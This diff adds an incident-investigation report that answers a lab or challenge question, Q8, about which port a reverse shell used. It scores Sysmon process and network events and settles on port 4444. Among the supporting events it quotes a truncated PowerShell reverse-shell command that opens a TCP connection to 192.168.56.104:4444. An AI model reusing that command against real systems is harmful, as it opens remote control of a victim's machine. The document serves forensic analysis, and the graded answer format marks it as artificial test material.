@@ -1,0 +1,17 @@
+Q8. Which port is used for the reverse shell?
+========================================================================
+Method: Event ID 3 (DestinationPort), cross-checked with Event ID 1
+Answer: Reverse-shell port: 4444  (Metasploit / msfvenom default handler)   [score 15]
+            download/staging ports excluded: 8080
+
+SUPPORTING EVENTS
+------------------------------------------------------------------------
+reverse-shell command -> [EID 1 Process creation] | 2023-08-14 09:14:02.000 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | CommandLine=powershell -nop -c $c=New-Object Net.Sockets.TCPClient('192.168.56.104',4444);$s=$c.GetStream()
+  +5  4444   port literal inside the shell command
+connection -> [EID 3 Network connection] | 2023-08-14 09:12:41.010 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | DestinationPort=8080
+  --  8080   skipped: already explained as a file download
+connection -> [EID 3 Network connection] | 2023-08-14 09:13:32.000 | Image=C:\Users\jdoe\AppData\Local\Temp\update.exe | DestinationPort=8080
+  --  8080   skipped: already explained as a file download
+connection -> [EID 3 Network connection] | 2023-08-14 09:14:03.000 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | DestinationPort=4444
+  +10 4444   connection made by the shell process itself
+connection -> [EID 3 Network connection] | 2023-08-14 09:15:00.000 | Image=C:\Program Files\Mozilla Firefox\firefox.exe | DestinationPort=443
